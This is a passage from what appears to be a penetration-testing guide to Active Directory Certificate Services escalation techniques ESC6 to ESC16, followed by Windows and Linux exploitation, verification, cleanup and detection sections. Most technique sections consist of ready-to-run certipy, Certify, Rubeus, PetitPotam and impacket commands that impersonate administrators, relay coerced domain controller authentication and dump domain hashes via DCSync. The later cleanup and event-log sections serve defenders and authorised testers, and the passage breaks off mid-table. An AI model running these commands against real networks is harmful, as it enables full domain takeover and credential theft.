# Request from SubCA. This will be denied, and will print a request ID
certipy req -u $USER@$DOMAIN -p "$PASS" -target $CAHOST -ca $CA \
  -template SubCA -upn administrator@$DOMAIN

# Approve your own failed request as an officer, then collect it
certipy ca -u $USER@$DOMAIN -p "$PASS" -target $CAHOST -ca $CA -issue-request 785
certipy req -u $USER@$DOMAIN -p "$PASS" -target $CAHOST -ca $CA -retrieve 785

certipy auth -pfx administrator.pfx -dc-ip $DC
```

With `ManageCA` alone you can also take the ESC6 route instead, setting the SAN flag and then enrolling normally, which is fewer steps but a much more damaging and more visible change to the CA.

**Yield.** Impersonation of any principal, plus persistent control of issuance policy. On the strong-mapping question, be careful to distinguish two different ESC7 routes. Approving your own request for a template you can already enrol in, or for `SubCA`, produces a certificate carrying **your own** SID in the security extension, so if you also supplied a forged UPN you are back in the ESC6 position and dependent on the domain controller's enforcement level. But `ManageCA` also lets you enable the requester-specified SAN flag and grant yourself `ManageCertificates`, and it lets you modify template ACLs and CA configuration generally, which reaches ESC4 and ESC16 territory where the constraint does not apply. Treat ESC7 as a route to the other techniques rather than as a self-contained impersonation, and pick the branch that is not blocked by mapping enforcement.

#### ESC8: relaying authentication to web enrolment

**What it is.** The CA's HTTP enrolment endpoints authenticate with NTLM and, in a default installation, without TLS or channel binding. Relay a coerced machine account authentication into `/certsrv` and request a client-auth certificate as that machine. Point the coercion at a domain controller and the certificate is a domain controller's, which means DCSync.

**Why it works.** Two separate failures compose. First, `/certsrv` accepts NTLM over plain HTTP, and HTTP has no channel binding, so an NTLM authentication captured elsewhere can be replayed into it. Second, AD CS will happily issue a `DomainController` or `Machine` certificate to a machine account that asks for it, and the resulting certificate authenticates that machine account. The relay converts "I can make this machine authenticate to me" into "I hold a two-year credential for this machine".

Compared with relaying to LDAP, this is far more robust: LDAP signing and channel binding have progressively closed the LDAP relay path, and SMB signing is on by default in current Windows, but HTTP endpoints have no signing to enable and EPA has to be turned on deliberately.

**Preconditions.** The Certification Authority Web Enrollment role (or CES, or NDES) installed and reachable; the endpoint not requiring HTTPS with Extended Protection for Authentication; a coercion primitive against the target (PetitPotam, DFSCoerce, PrinterBug, ShadowCoerce, Coercer, WebDAV-based coercion, or simply waiting for authentication); NTLM not disabled for the CA. Coercion mechanics are covered in the coercion and relay material earlier in this section.

**Exploitation.**

```bash
# Terminal 1: relay to the web enrolment endpoint, requesting a DC certificate
certipy relay -target "http://$CAHOST" -template DomainController

# Terminal 2: coerce the target DC to authenticate to you
coercer coerce -l $ATTACKER -t $DC -u $USER -p "$PASS" -d $DOMAIN
# or
python3 PetitPotam.py -d $DOMAIN -u $USER -p "$PASS" $ATTACKER $DC

# The relay writes out a pfx for the machine account
certipy auth -pfx "dc\$.pfx" -dc-ip $DC

# Machine account NT hash in hand, take the domain
nxc smb $DC -u 'DC$' -H $NTHASH --ntds
```

Certipy's relay arguments changed at 4.7.0 and the change is easy to get wrong because both flags still exist. Up to 4.6.0, `-ca` took the IP address or hostname of the CA and there was no `-target`. From 4.7.0 onward, including 5.x, `-target` is required and takes a scheme-qualified target, `http://ca.corp.local` for ESC8 or `rpc://ca.corp.local` for ESC11, while `-ca` was repurposed to mean the CA's *name*, for example `CORP-CA`, and is only needed for the RPC path.

**Common mistake.** Copying a pre-4.7 command line and passing the CA's hostname to `-ca` on a current build. The relay will attempt to resolve it as a CA name and fail in a way that looks like an enrolment permissions problem rather than an argument problem.

Use the `DomainController` template when relaying a domain controller and `Machine` or `Computer` when relaying an ordinary computer account, because the template's enrolment ACL is checked against the relayed identity.

**Yield.** A domain controller machine account credential, therefore DCSync, therefore the domain. This remains one of the most reliable full-domain compromises available.

**Note.** ESC11 is the same attack against the RPC enrolment interface and does not need a web endpoint at all, which is why disabling `/certsrv` alone is not a fix.

#### ESC9: no security extension on the template

**What it is.** `msPKI-Enrollment-Flag` contains `CT_FLAG_NO_SECURITY_EXTENSION` (`0x80000`), so certificates from this template are issued without the SID security extension. The domain controller therefore has no strong mapping available and, in compatibility mode, falls back to mapping by the UPN in the certificate. Combined with write access to a victim account's `userPrincipalName`, you make the victim temporarily claim to be the target, enrol as the victim, and revert.

**Why it works.** Post-KB5014754 the SID extension is what binds a certificate to an account. This template flag removes that binding by design, for compatibility with third-party CAs and mapping schemes. Without the extension the domain controller uses the certificate's UPN, and `userPrincipalName` is a writable attribute on a user object.

**Preconditions.** `GenericWrite` or the specific write on `userPrincipalName` over some account you can also authenticate as (or whose password you can reset); a published template with `CT_FLAG_NO_SECURITY_EXTENSION` and a client authentication EKU that the victim can enrol in; the domain controller not in full enforcement (`StrongCertificateBindingEnforcement` of `0` or `1`), or Schannel weak mapping enabled if you intend to use LDAP rather than PKINIT.

Note the UPN uniqueness constraint. You cannot set the victim's UPN to a value already present on another object, so targeting a user who has an explicit UPN means clearing theirs first, which you usually cannot do. The usual target is `Administrator`, which in most estates has no explicit `userPrincipalName`, so setting the victim's UPN to the bare `administrator` succeeds and still maps.

**Exploitation.**

```bash
# 1. Point the victim's UPN at the target
certipy account update -u $USER@$DOMAIN -p "$PASS" -dc-ip $DC -user victim -upn administrator

# 2. Enrol as the victim in the no-security-extension template
certipy req -u victim@$DOMAIN -p "$VICTIMPASS" -ca $CA -target $CAHOST -template $TEMPLATE

# 3. Put the victim's UPN back before anything notices
certipy account update -u $USER@$DOMAIN -p "$PASS" -dc-ip $DC -user victim -upn victim@$DOMAIN

# 4. The certificate has UPN 'administrator' with no domain, so name the domain explicitly
certipy auth -pfx administrator.pfx -domain $DOMAIN -dc-ip $DC
```

**Yield.** TGT and NT hash for the mapped account. Note the ordering: the certificate is bound to the UPN string, not to the victim, so reverting the UPN in step 3 does not invalidate the certificate. Revert early.

#### ESC10: weak certificate mappings on the domain controller

**What it is.** The same primitive as ESC9, but the weakness is in the domain controller's registry rather than in a template, so no special template is required and any client-auth template will do. Two cases.

**Case 1: `StrongCertificateBindingEnforcement = 0`** under `HKLM\SYSTEM\CurrentControlSet\Services\Kdc`. Strong mapping is disabled outright, so the Kerberos KDC maps by UPN even when the SID extension is present. Any client-auth template plus write access to a victim's UPN is an escalation.

**Case 2: `CertificateMappingMethods` includes `0x4`** under `HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Schannel`. Schannel, and therefore LDAPS client certificate authentication, maps by UPN. This case is the more powerful of the two, because machine accounts have no `userPrincipalName` attribute at all, so there is no uniqueness conflict when you set a victim user's UPN to `$DC$@$DOMAIN`. You then authenticate over LDAPS as the domain controller, which gets you an LDAP session with domain controller privileges even though you never touched Kerberos.

**Why it works.** Both values are the mapping policy knobs KB5014754 introduced or repurposed. They are frequently set back to weak values to fix a broken third-party VPN, NAC or MDM integration, and the change is rarely revisited.

**Preconditions.** The relevant registry value as above; write access to some account's `userPrincipalName`; the ability to authenticate as that account; for case 2, LDAPS enabled on the domain controller.

**Exploitation.**

```bash
# Case 1: identical to ESC9 but against an ordinary template
certipy account update -u $USER@$DOMAIN -p "$PASS" -user victim -upn administrator
certipy req -u victim@$DOMAIN -p "$VICTIMPASS" -ca $CA -target $CAHOST -template User
certipy account update -u $USER@$DOMAIN -p "$PASS" -user victim -upn victim@$DOMAIN
certipy auth -pfx administrator.pfx -domain $DOMAIN -dc-ip $DC

# Case 2: target a machine account and authenticate over Schannel to LDAP
certipy account update -u $USER@$DOMAIN -p "$PASS" -user victim -upn 'DC01$@corp.local'
certipy req -u victim@$DOMAIN -p "$VICTIMPASS" -ca $CA -target $CAHOST -template User
certipy account update -u $USER@$DOMAIN -p "$PASS" -user victim -upn victim@$DOMAIN
certipy auth -pfx dc01.pfx -dc-ip $DC -ldap-shell
```

From the resulting LDAP shell the usual moves apply: `set_rbcd` to configure resource-based constrained delegation from a computer you control to the domain controller, `add_computer` if you need one and the machine account quota permits, or writing key credentials. Then S4U to the domain controller and DCSync.

**Yield.** Case 1 gives you any user. Case 2 gives you any account including domain controllers, via LDAP rather than Kerberos.

#### ESC11: relaying to the RPC enrolment interface

**What it is.** ESC8 without a web server. The MS-ICPR RPC interface on the CA does not enforce packet privacy unless the `IF_ENFORCEENCRYPTICERTREQUEST` interface flag is set, and an RPC interface without packet privacy is relayable.

**Why it works.** MS-ICPR authenticates over RPC using NTLM. With packet privacy enforced, the relayed session cannot be used because the attacker cannot produce the required sealing. Without it, the CA accepts the relayed authentication and issues a certificate to the relayed identity, exactly as in ESC8. The point is that the mitigation for ESC8, removing or hardening the web enrolment endpoint, does nothing here, because the RPC interface is how normal enrolment works and cannot be removed.

**Preconditions.** `IF_ENFORCEENCRYPTICERTREQUEST` not set on the CA (certipy reports this as request encryption not enforced); a coercion primitive; RPC reachable on the CA.

```cmd
certutil -config "$CAHOST\$CA" -getreg "CA\InterfaceFlags"
```

**Exploitation.**

```bash
certipy relay -target "rpc://$CAHOST" -ca $CA -template Machine
# then coerce as for ESC8
```

**Yield.** As ESC8: a certificate for the relayed machine account.

#### ESC12: CA key held on an HSM with a recoverable authentication secret

**What it is.** Where the CA private key lives on a YubiHSM, the CA service needs an authentication key password to use it, and that password is stored so the service can start unattended. An attacker with a shell on the CA host can read it and then use the "non-exportable" key through the HSM connector to sign forged certificates.

**Why it works.** Key non-exportability protects the key material, not its use. If you can authenticate to the HSM you can sign with the key, and the credential to authenticate to the HSM has to be available to the service, therefore to a local administrator.

**Preconditions.** A shell on the CA host and a CA whose key is held in a YubiHSM 2 through the Yubico Key Storage Provider. The authentication key password the KSP uses is stored in cleartext in the registry at `HKLM\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword`. Note the privilege requirement is lower than you would expect: the Yubico KSP does not check which user account is calling it through CNG, so any account that can read that registry value and reach the connector can sign, not only a local administrator. Confirm the value is present on the host before relying on it, since deployment guides differ on how the KSP is provisioned.

**Yield.** Certificate forgery equivalent to CA key theft, so it belongs with the DPERSIST material in the certificate theft and persistence coverage later in this section. Included here for taxonomy completeness. Rare in practice, worth knowing because it is the answer to "the key is in an HSM so we are fine".

#### ESC13: issuance policy linked to a group

**What it is.** A certificate template referencing an issuance policy OID whose object in `CN=OID` carries an `msDS-OIDToGroupLink` pointing at an AD group. Authenticating with a certificate from that template causes the KDC to add that group to your PAC. If you can enrol, you get the group, with no subject manipulation at all.

**Why it works.** The OID-to-group link is a legitimate feature for expressing assurance levels: a certificate issued under a high-assurance policy confers membership of a group that gates sensitive resources. The KDC honours it by adding the group SID to the ticket. Nothing checks that the person enrolling was supposed to reach that group by any other means, so enrolment rights on the template are equivalent to membership of the group.

Critically, this is unaffected by strong mapping. The certificate is legitimately issued to you, in your own name, with your own SID. You are not impersonating anybody; you are collecting a group you were never meant to have.

**Preconditions.** Enrolment rights on a template with a client authentication EKU whose `msPKI-Certificate-Policy` references an `msPKI-Enterprise-Oid` object with a non-empty `msDS-OIDToGroupLink`, and the linked group being one whose membership is meaningful. Active Directory enforces two constraints on the link, checked both when the attribute is set and when anyone later tries to add a member: the group must have **universal** scope, and it must be **empty**. That second constraint is the one people misread. An empty group is not a powerless group. Its power comes from being nested inside other groups and from ACLs granted directly to it, neither of which the emptiness check touches, and note that `Enterprise Admins` and `Schema Admins` are universal by default.

**Common mistake.** Dismissing an OID group link because the linked group has no members. Emptiness is a requirement of the feature, not evidence that the link is harmless. Check the group's own group memberships and the ACLs that reference it before deciding the finding is low severity.

**Exploitation.** There is nothing clever to do. Enrol and authenticate.

```bash
certipy find -u $USER@$DOMAIN -p "$PASS" -dc-ip $DC -stdout   # look for the OID group link
certipy req -u $USER@$DOMAIN -p "$PASS" -ca $CA -target $CAHOST -template $TEMPLATE
certipy auth -pfx $USER.pfx -dc-ip $DC
```

**Yield.** Membership of the linked group inside your Kerberos ticket, for the life of the certificate. Verify by examining the group SIDs in the resulting ticket's PAC rather than by checking your group membership in the directory, because the directory will not show it.

#### ESC14: abusing explicit certificate mappings

**What it is.** The `altSecurityIdentities` attribute on a user or computer object is an explicit mapping from a certificate to that account. Write access to it means you can declare that a certificate you hold represents that account.

**Why it works.** Explicit mapping exists so that a certificate with no useful UPN, typically from an external or partner CA, can still authenticate a domain account. The mapping is expressed as a string in `altSecurityIdentities`, and the domain controller honours it. Whoever can write the attribute controls the mapping.

The important subtlety is that this survives strong mapping enforcement if you choose the right mapping type. `X509IssuerSerialNumber`, `X509SKI` and `X509SHA1PublicKey` are strong mappings, and you can satisfy all three with a certificate legitimately issued to yourself: enrol in any client-auth template in your own name, then write the issuer and serial (or the subject key identifier, or the public key hash) of *your own* certificate into the victim's `altSecurityIdentities`. The domain controller now has a strong, verifiable mapping from your certificate to the victim's account, and full enforcement does not help.

The weak types, `X509IssuerSubject`, `X509SubjectOnly` and `X509RFC822`, are easier to satisfy (they let you claim a mapping based on subject or email alone, so a certificate whose subject you can influence will do) and are the ones that strong mapping enforcement is intended to reject.

**Preconditions.** Write access to `altSecurityIdentities` on the target, whether via `GenericAll`, `GenericWrite`, `WriteProperty` on that attribute, or an over-broad delegation. Plus the ability to obtain any certificate from a CA in `NTAuthCertificates`, which any domain user usually has via the default `User` template.

**Exploitation.**

```bash
# 1. Get an ordinary certificate in your own name
certipy req -u $USER@$DOMAIN -p "$PASS" -ca $CA -target $CAHOST -template User

# 2. Read the issuer and serial out of it
certipy cert -pfx $USER.pfx -nokey -out $USER.crt
openssl x509 -in $USER.crt -noout -issuer -serial

# 3. Write a strong explicit mapping onto the victim.
#    Format: X509:<I>{issuer DN, reversed component order}<SR>{serial, reversed byte order}
bloodyAD -u $USER -p "$PASS" -d $DOMAIN --host $DC set object victim altSecurityIdentities \
  -v 'X509:<I>DC=local,DC=corp,CN=CORP-CA<SR>1200000000AABBCCDDEEFF'

# 4. Authenticate as the victim with your own certificate
certipy auth -pfx $USER.pfx -dc-ip $DC -username victim
```

The mapping string construction is fiddly and it is where this technique goes wrong. Both components are reversed relative to how a certificate viewer or `openssl` prints them. The issuer is written with its relative distinguished names in reverse order, so a certificate displaying `CN=CORP-CA, DC=corp, DC=local` becomes `DC=local,DC=corp,CN=CORP-CA`. The serial number is written with its **bytes** reversed, not its characters: each two-hex-digit byte keeps its own order and only the sequence of bytes is reversed, so a displayed serial of `ff ee dd cc bb aa 00 00 00 00 00 12` is written `1200000000AABBCCDDEEFF`. Getting either wrong produces a silent mapping failure rather than an error. Build it with tooling that implements the format rather than by hand, and verify by authenticating.

**Common mistake.** Reversing the serial number as a character string instead of as a sequence of bytes. The result is the same length and looks plausible, and the only symptom is that authentication falls back to whatever weak mapping the domain controller will still accept, or fails with no useful message. Note also that since the February 2024 updates the Active Directory Users and Computers name-mapping dialogue defaults to writing the strong `X509IssuerSerialNumber` form rather than the weak `X509IssuerSubject` form, which means legitimate mappings in a current estate are the strong kind and yours should match.

**Yield.** Authentication as the victim using a certificate that is legitimately yours, which is both strong-mapping-proof and unusually quiet at the CA, because the CA only ever saw a normal user enrolling in a normal template. The loud artefact is the directory write, not the certificate request.

#### ESC15: application policy injection into version 1 templates (CVE-2024-49019)

**What it is.** Schema version 1 templates handle application policies differently from later versions, and a requester can inject arbitrary application policy OIDs into the request. A template intended only for server authentication can therefore yield a certificate with Client Authentication, or with Certificate Request Agent, neither of which the template grants.

**Why it works.** Version 1 templates predate the separation of `msPKI-Certificate-Application-Policy` from `pKIExtendedKeyUsage`, and the CA honoured application policy extensions supplied in the CSR for those templates. Combined with enrollee-supplied subject, which the default `WebServer` template has, the result is an arbitrary-identity client authentication certificate from a template that a reviewer would classify as harmless.

**Preconditions.** A CA not patched for CVE-2024-49019 (fixed November 2024) and a published version 1 schema template with enrollee-supplied subject that you can enrol in. The default `WebServer` template is the canonical example.

**Exploitation.** Two variants: inject Client Authentication and impersonate directly, or inject Certificate Request Agent and use the result as an enrolment agent certificate to chain into ESC3, which is the stronger option because the on-behalf-of route is not affected by strong mapping.

```bash
# Direct: client auth on a server-auth template, with a chosen UPN
certipy req -u $USER@$DOMAIN -p "$PASS" -ca $CA -target $CAHOST \
  -template WebServer -upn administrator@$DOMAIN \
  -application-policies 'Client Authentication'

# Chained: request agent, then enrol on behalf of the target
certipy req -u $USER@$DOMAIN -p "$PASS" -ca $CA -target $CAHOST \
  -template WebServer -application-policies 'Certificate Request Agent'
certipy req -u $USER@$DOMAIN -p "$PASS" -ca $CA -target $CAHOST \
  -template User -on-behalf-of "$NETBIOS\\Administrator" -pfx $USER.pfx
```

**Yield.** Full impersonation, and on the chained path it is strong-mapping-proof for the same reason ESC3 is.

#### ESC16: security extension disabled on the CA

**What it is.** ESC9 applied to the entire CA. The CA's policy module has the SID security extension OID `1.3.6.1.4.1.311.25.2` in its `DisableExtensionList`, so no certificate it issues carries the extension, and every certificate it issues is therefore weakly mapped.

**Why it works.** The disable list exists so that administrators can suppress extensions that break third-party consumers, and the SID extension broke a great many of them when it arrived in 2022. Suppressing it globally is a common workaround, and it re-enables the entire pre-2022 attack surface across every template on that CA.

**Preconditions.** The extension in the CA's disable list; write access to a victim's `userPrincipalName` (or, without that, this simply restores ESC1 and ESC6 to full effectiveness on that CA); the domain controller not in full enforcement.

```cmd
certutil -config "$CAHOST\$CA" -getreg "policy\DisableExtensionList"
```

The value lives under the active policy module for the CA. The name of that module is itself a registry value: read `Active` from `HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\$CA\PolicyModules` (normally `CertificateAuthority_MicrosoftDefault.Policy`), then read `DisableExtensionList` from `HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\$CA\PolicyModules\<that value>`. It is a REG_MULTI_SZ list of OIDs. The same key holds `EditFlags`, which is where the ESC6 `EDITF_ATTRIBUTESUBJECTALTNAME2` bit lives, and `RequestDisposition`. Certipy reads all of these over the Remote Registry Protocol during `find`, which is why full CA configuration collection needs more than LDAP and why `-dc-only` will not detect ESC16.

**Exploitation.** Identical to ESC9, except that no particular template flag is needed and any client-auth template on that CA will do.

```bash
certipy account update -u $USER@$DOMAIN -p "$PASS" -user victim -upn administrator
certipy req -u victim@$DOMAIN -p "$VICTIMPASS" -ca $CA -target $CAHOST -template User
certipy account update -u $USER@$DOMAIN -p "$PASS" -user victim -upn victim@$DOMAIN
certipy auth -pfx administrator.pfx -domain $DOMAIN -dc-ip $DC
```

**Yield.** Everything ESC1 and ESC6 gave you before 2022, on that CA, plus the UPN-swap route for templates that build their own subject.

The taxonomy is open-ended and new numbers are assigned as research lands. Treat the list above as the current set rather than the final set, and when `certipy find` reports a condition with a number you do not recognise, read the condition rather than the number.

### Exploitation from Windows

The Windows flow is Certify to request and Rubeus to authenticate, with an awkward format conversion between them that the source shows without explanation.

```cmd
:: 1. Find something to abuse
Certify.exe find /vulnerable /currentuser

:: 2. Request, naming your victim in the SAN
Certify.exe request /ca:$CAHOST\$CA /template:$TEMPLATE /altname:administrator

:: On-behalf-of, for ESC3
Certify.exe request /ca:$CAHOST\$CA /template:User /onbehalfof:$NETBIOS\Administrator /enrollcert:agent.pfx /enrollcertpw:Password123

:: Machine context, for a computer template
Certify.exe request /ca:$CAHOST\$CA /template:Machine /machine

:: Collect a request that went pending and was later approved
Certify.exe download /ca:$CAHOST\$CA /id:785
```

Certify prints a PEM block containing the RSA private key and the issued certificate. Rubeus, and the Windows CryptoAPI generally, wants a PKCS#12 file. Hence the conversion, and hence the two flags the source includes without saying why:

```bash
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

`-keyex` marks the key's intended usage as key exchange rather than signature only. PKINIT establishes the reply key by RSA key transport or Diffie-Hellman, so a key marked signature-only will be rejected or will simply not be offered by the provider. `-CSP "Microsoft Enhanced Cryptographic Provider v1.0"` writes a CSP name attribute into the PKCS#12 bag so that when the key is imported, Windows binds it to a provider that supports the required operations rather than picking a default that does not. Omit either and you get an unhelpful key-usage or provider error from Rubeus rather than a clear diagnosis. Set an export password when prompted and pass it to Rubeus with `/password:`.

```cmd
:: 3. PKINIT, inject the ticket, and pull the NT hash out of the PAC
Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password:Password123 /domain:$DOMAIN /dc:$DC /ptt /getcredentials

:: Certificate already in the user store, referenced by thumbprint
Rubeus.exe asktgt /user:Administrator /certificate:THUMBPRINT /ptt /getcredentials

:: Machine account, for an ESC8-style computer certificate
Rubeus.exe asktgt /user:DC01$ /certificate:cert.pfx /password:Password123 /ptt /getcredentials /enctype:aes256
```

`/getcredentials` is the UnPAC-the-hash step. It performs the user-to-user exchange needed to decrypt `PAC_CREDENTIAL_INFO` and prints the NTLM hash, which is usually more useful than the ticket because it is not time-limited to the ticket lifetime.

For ESC4-style template modification from Windows, `Certify.exe` does not write template attributes; use PowerShell against the configuration partition, or the `PSPKI` module's template cmdlets where it is installed, or run certipy from a Linux host with the credentials you already hold.

### Exploitation from Linux

Certipy covers the whole flow and is the better option whenever you have network access, because it avoids dropping tooling on a host and avoids the format conversion entirely.

```bash
# Enumerate
certipy find -u $USER@$DOMAIN -p "$PASS" -dc-ip $DC -stdout

# Request. -target must be a name the CA answers to, and Kerberos needs it to be the FQDN
certipy req -u $USER@$DOMAIN -p "$PASS" -ca $CA -target $CAHOST -template $TEMPLATE -upn administrator@$DOMAIN

# On behalf of another principal, NetBIOS form
certipy req -u $USER@$DOMAIN -p "$PASS" -ca $CA -target $CAHOST -template User -on-behalf-of "$NETBIOS\\Administrator" -pfx agent.pfx

# Retrieve a pending or later-approved request
certipy req -u $USER@$DOMAIN -p "$PASS" -ca $CA -target $CAHOST -retrieve 785

# PKINIT and unPAC the hash
certipy auth -pfx administrator.pfx -dc-ip $DC

# When the certificate's UPN has no domain suffix, or names an account ambiguously
certipy auth -pfx administrator.pfx -domain $DOMAIN -username administrator -dc-ip $DC

# Split a pfx for tools that want PEM
certipy cert -pfx administrator.pfx -nokey -out user.crt
certipy cert -pfx administrator.pfx -nocert -out user.key
```

`certipy auth` writes a credential cache. Use it directly:

```bash
export KRB5CCNAME=$PWD/administrator.ccache
nxc smb $DC -u administrator -k --use-kcache --shares
# or with the NT hash it printed
nxc smb $DC -u administrator -H $NTHASH --ntds
```

Kerberos needs working name resolution. If the certipy request or the subsequent PKINIT fails on an SPN or a realm lookup, fix DNS first: point `/etc/resolv.conf` at the domain controller, or set the CA and DC FQDNs in `/etc/hosts`, and use FQDNs everywhere rather than IPs.

### When PKINIT is unavailable

PKINIT is not always there. It requires at least one domain controller to hold a KDC certificate from a template such as `Kerberos Authentication`, `Domain Controller Authentication` or `Domain Controller`. A CA can exist purely for TLS or code signing, with no domain controller ever enrolled, in which case every `certipy auth` will fail with `KDC_ERR_PADATA_TYPE_NOSUPP` no matter how good your certificate is. The certificate is still a valid credential; it just cannot buy you a ticket.

The alternative is **Schannel**: authenticate the certificate directly to a TLS service that performs client certificate mapping. In a domain that means LDAPS on a domain controller, on 636 or on 3269 for the global catalogue. The domain controller maps the presented client certificate to an account using the same mapping logic discussed above (SID extension, explicit `altSecurityIdentities`, or the `CertificateMappingMethods` weak methods) and the LDAP session runs with that account's rights.

```bash
# Interactive LDAP session authenticated by the certificate
certipy auth -pfx administrator.pfx -dc-ip $DC -ldap-shell

# Same thing with PassTheCert, taking PEM inputs
certipy cert -pfx administrator.pfx -nokey -out user.crt
certipy cert -pfx administrator.pfx -nocert -out user.key
python3 passthecert.py -action ldap-shell -crt user.crt -key user.key -domain $DOMAIN -dc-ip $DC
```

The shell gives you directory writes rather than a ticket, so the escalation continues through LDAP: `set_rbcd` to give a computer you control delegation to the target, `add_computer` when you need a principal and the machine account quota allows it, `write_gpo_dacl`, `change_password`, `add_user_to_group`, or writing `msDS-KeyCredentialLink` for shadow credentials. From resource-based constrained delegation you take an S4U service ticket to the target and proceed as normal.

```bash
# After set_rbcd from the LDAP shell
impacket-getST -spn "cifs/$DC" -impersonate Administrator -dc-ip $DC "$DOMAIN/attacker\$:$PASS"
export KRB5CCNAME=$PWD/Administrator@cifs_$DC.ccache
impacket-secretsdump -k -no-pass "$DOMAIN/Administrator@$DC" -just-dc-ntlm
```

Two things gate the Schannel route. The domain controller must have LDAPS working, which means it must itself hold a server certificate, and if the PKI is new or broken that may not be the case. And the Schannel mapping must succeed, which under the default post-2022 `CertificateMappingMethods` of `0x18` means the certificate needs the SID extension matching the account you are claiming, or a strong explicit mapping. A forged-UPN certificate that fails PKINIT will usually fail Schannel too, for the same reason. Where `0x4` is still set, the UPN route works and that is ESC10 case 2.

The source's closing line, that LDAPS or Schannel can be used with the `ldap-shell` flag if PKINIT is not working, is correct as far as it goes. What it omits is that this is a different mapping path with different preconditions and a different set of follow-on primitives, not a drop-in substitute for a TGT.

### Verify it worked

Do not assume a `.pfx` on disk means success. Certificate issuance and certificate authentication are separate gates and the second one fails often.

```bash
# Inspect what you actually got before trying to use it
certipy cert -pfx administrator.pfx -nokey -out check.crt
openssl x509 -in check.crt -noout -text | grep -A4 -E 'Subject Alternative Name|Extended Key Usage|1.3.6.1.4.1.311.25.2|Not After'
```

Three things to confirm on the certificate itself: the SAN contains the UPN or DNS name you intended, an EKU permitting client authentication is present, and whether the SID security extension `1.3.6.1.4.1.311.25.2` is present and whose SID it names. That last check tells you in advance whether strong mapping will contradict you, which saves guessing at a `KDC_ERR` later.

```bash
# Then confirm it authenticates and confirm what it got you
certipy auth -pfx administrator.pfx -dc-ip $DC
export KRB5CCNAME=$PWD/administrator.ccache
nxc smb $DC -u administrator -k --use-kcache --shares
nxc smb $DC -u administrator -H $NTHASH --ntds --user krbtgt
```

```cmd
:: Windows: is the ticket in the session, and does it work
Rubeus.exe triage
klist
dir \\$DC\C$
```

Checking the resulting privileges matters as much as checking that authentication worked, because ESC13 and some ESC3 paths give you group memberships that do not appear in the directory. Inspect the PAC of the ticket rather than querying your own group membership:

```cmd
Rubeus.exe describe /ticket:base64ticket
```

```bash
# Enumerate what the resulting identity can actually do
nxc ldap $DC -u administrator -k --use-kcache --admin-count
bloodyAD -k --host $DC -d $DOMAIN get writable
```

### Cleanup

Certificate abuse leaves durable state in three places and only one of them is really reversible.

**Template and object modifications must be reverted.** ESC4 is the worst offender: a template rewritten to enrollee-supplies-subject with client authentication and open enrolment rights is a standing forest-wide compromise, is trivially visible in any subsequent review, and will show up as your account in the modification metadata. Restore from the saved configuration as soon as you hold a working certificate, and verify the revert.

```bash
certipy template -u $USER@$DOMAIN -p "$PASS" -dc-ip $DC -template $TEMPLATE -configuration $TEMPLATE.json
certipy find -u $USER@$DOMAIN -p "$PASS" -dc-ip $DC -vulnerable -stdout    # $TEMPLATE should no longer appear
```

The same applies to every other write: revert a UPN changed for ESC9, ESC10 or ESC16 immediately after the request rather than after the exploitation, since the certificate is already bound to the string; remove an `altSecurityIdentities` entry added for ESC14, and note that leaving it is a persistence mechanism, so leave it only if that is what you intend; remove an officer added with `certipy ca -add-officer` using `-remove-officer`; unset `EDITF_ATTRIBUTESUBJECTALTNAME2` if you set it, because leaving it makes the whole CA permanently ESC6.

**Your certificate cannot be un-issued.** It remains valid for the template's validity period regardless of password resets. If you hold `ManageCertificates` you can revoke it, which is honest cleanup but also destroys your own access, since the KDC checks revocation during PKINIT. Record the serial number so the customer can revoke it themselves.

```cmd
certutil -config "$CAHOST\$CA" -revoke <serial>
```

**Your request is permanent.** The CA database row is not removable in any practical sense and should be treated as part of the evidence trail you are deliberately leaving.

Delete the private keys you generated when you are finished. A `.pfx` for a Domain Admin sitting in a scratch directory is a credential, and it does not expire when the engagement does.

### Detection and opsec

AD CS abuse is the unusual combination of extremely powerful and extremely well evidenced. Every technique here goes through a service whose entire purpose is to keep an authoritative, non-repudiable record of who asked for what. Assume that a competent investigation will reconstruct exactly what you did.

**The CA request database is the definitive record.** Every request, issued, denied or pending, is stored with the requester's authenticated account name, the template used, the request attributes including any SAN you supplied, the resulting serial number and thumbprint, the disposition, and timestamps. It is queryable and it is retained. This is the single artefact that makes AD CS abuse trivially attributable after the fact.

```cmd
certutil -view -restrict "RequestID=785"
certutil -view -out "RequestID,Request.RequesterName,Request.SubmittedWhen,CertificateTemplate,SerialNumber,Request.RequestAttributes,Request.DispositionMessage"
```

The column set is defined by the CA database schema and varies with CA version, so read it off the host rather than working from a remembered list: `certutil -schema` prints the request table schema, and `certutil -schema ext`, `certutil -schema attrib` and `certutil -schema crl` print the extension, attribute and CRL table schemas. `-restrict` takes a comma-separated list of `column<operator>value` terms, and prefixing one column with `+` or `-` sets the sort order. `-restrict requestID==$` shows every column for the most recent row, which is the quickest way to see what is actually available.

**CA event logging** is written to the Security log on the CA, but only if audit filtering is enabled on the CA (`certutil -setreg CA\AuditFilter 127` plus a service restart) and object access auditing is on. That is far from universal, which is why many estates have the database record but no events.

| Event ID | Meaning |
| --- | --- |
| 4886 | Certificate Services received a certificate request |
| 4887 | Certificate Services approved a request and issued a certificate |
| 4888 | Certificate Services denied a certificate request |
| 4889 | Certificate Services set a request to pending |
| 4890 | Certificate manager settings changed, the ESC7 officer change |
| 4899 | A certificate template was updated, the ESC4 signal |
| 4900 | Certificate template security was updated |
| 4882 | The security permissions for Certificate Services changed, the CA DACL modification that precedes ESC7 |

A 4886 with no matching 4887, or a 4888 followed later by a 4887 for the same request ID, is the ESC7 pattern in two events. A 4899 followed within seconds by a 4886 and a 4887 on the modified template, followed by another 4899, is ESC4 written out in full.

**On the domain controller**, PKINIT authentication is visible in event 4768, the Kerberos TGT request, whose Certificate Information fields (issuer name, serial number, thumbprint) are populated only for certificate-based authentication and are empty for password-based. Any 4768 for a privileged account with certificate fields populated, from a source address that is not a smart card user's workstation, is the tell. The serial number in that event joins directly to the CA database row, which joins to the requesting account. That join is how these engagements get reconstructed.

The mapping events introduced by KB5014754 are also on the domain controller, in the System log from the Kdcsvc source, and the three are distinct in a way that matters:

| ID | Meaning |
| --- | --- |
